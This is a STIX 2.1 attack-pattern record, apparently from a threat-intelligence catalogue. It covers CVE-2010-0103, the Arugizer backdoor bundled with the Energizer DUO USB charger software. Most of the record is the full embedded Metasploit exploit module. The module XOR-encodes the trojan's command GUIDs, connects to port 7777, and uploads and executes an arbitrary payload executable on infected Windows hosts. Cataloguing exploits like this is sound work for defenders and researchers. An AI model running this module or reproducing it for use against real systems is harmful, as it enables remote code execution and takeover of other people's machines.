{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2daaa32-57ce-413f-a7e4-e72747d36470",
    "created": "2024-08-14T16:47:47.614829Z",
    "modified": "2024-08-14T16:47:47.614834Z",
    "name": "Energizer DUO USB Battery Charger Arucer.dll Trojan Code Execution",
    "description": " This module will execute an arbitrary payload against any system infected with the Arugizer trojan horse. This backdoor was shipped with the software package accompanying the Energizer DUO USB battery charger. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/backdoor/energizer_duo_payload.rb",
            "external_id": "energizer_duo_payload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Energizer DUO USB Battery Charger Arucer.dll Trojan Code Execution',\n      'Description'    => %q{\n          This module will execute an arbitrary payload against\n        any system infected with the Arugizer trojan horse. This\n        backdoor was shipped with the software package accompanying\n        the Energizer DUO USB battery charger.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2010-0103'],\n          ['OSVDB', '62782'],\n          ['US-CERT-VU', '154421']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-03-05'\n      ))\n\n\n    register_options(\n      [\n        Opt::RPORT(7777),\n      ])\n  end\n\n  def trojan_encode(str)\n    str.unpack(\"C*\").map{|c| c ^ 0xE5}.pack(\"C*\")\n  end\n\n  def trojan_command(cmd)\n    cid = \"\"\n\n    case cmd\n    when :exec\n      cid = \"{8AF1C164-EBD6-4b2b-BC1F-64674E98A710}\"\n    when :dir\n      cid = \"{0174D2FC-7CB6-4a22-87C7-7BB72A32F19F}\"\n    when :write\n      cid = \"{98D958FC-D0A2-4f1c-B841-232AB357E7C8}\"\n    when :read\n      cid = \"{F6C43E1A-1551-4000-A483-C361969AEC41}\"\n    when :nop\n      cid = \"{783EACBF-EF8B-498e-A059-F0B5BD12641E}\"\n    when :find\n      cid = \"{EA7A2EB7-1E49-4d5f-B4D8-D6645B7440E3}\"\n    when :yes\n      cid = \"{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}\"\n    when :runonce\n      cid = \"{384EBE2C-F9EA-4f6b-94EF-C9D2DA58FD13}\"\n    when :delete\n      cid = \"{4F4F0D88-E715-4b1f-B311-61E530C2C8FC}\"\n    end\n\n    trojan_encode(\n      [cid.length + 1].pack(\"V\") + cid  + \"\\x00\"\n    )\n  end\n\n  def exploit\n\n    nam = \"C:\\\\\" + Rex::Text.rand_text_alphanumeric(12) + \".exe\" + \"\\x00\"\n    exe = generate_payload_exe + \"\\x00\"\n\n\n    print_status(\"Trying to upload #{nam}...\")\n    connect\n\n    # Write file request\n    sock.put(trojan_command(:write))\n    sock.put(trojan_encode([nam.length].pack(\"V\")))\n    sock.put(trojan_encode(nam))\n    sock.put(trojan_encode([exe.length].pack(\"V\")))\n    sock.put(trojan_encode(exe))\n\n    # Required to prevent the server from spinning a loop\n    sock.put(trojan_command(:nop))\n\n    disconnect\n\n    #\n    # Execute the payload\n    #\n\n    print_status(\"Trying to execute #{nam}...\")\n\n    connect\n\n    # Execute file request\n    sock.put(trojan_command(:exec))\n    sock.put(trojan_encode([nam.length].pack(\"V\")))\n    sock.put(trojan_encode(nam))\n\n    # Required to prevent the server from spinning a loop\n    sock.put(trojan_command(:nop))\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-05",
    "x_mitre_platforms": [
        "win'"
    ]
}